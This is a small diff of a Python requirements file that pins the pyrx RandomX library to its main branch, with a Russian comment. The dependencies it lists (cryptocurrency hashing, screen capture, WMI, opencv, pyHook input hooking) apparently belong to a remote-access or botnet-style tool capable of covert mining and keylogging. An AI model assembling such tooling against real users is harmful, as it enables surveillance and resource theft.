@@ -1,5 +1,5 @@
 py-cryptonight>=0.2.4
-git+https://github.com/jtgrassie/pyrx.git#egg=pyrx
+git+https://github.com/jtgrassie/pyrx.git@main#egg=pyrx  # Обновленная версия
 
 mss==5.0.0;python_version>'3'
 WMI==1.4.9;python_version>'3'
@@ -27,4 +27,3 @@ opencv-python==3.4.3.18;python_version<'3'
 
 pyHook==1.5.1;sys.platform=='win32'
 pypiwin32==223;sys.platform=='win32'
-
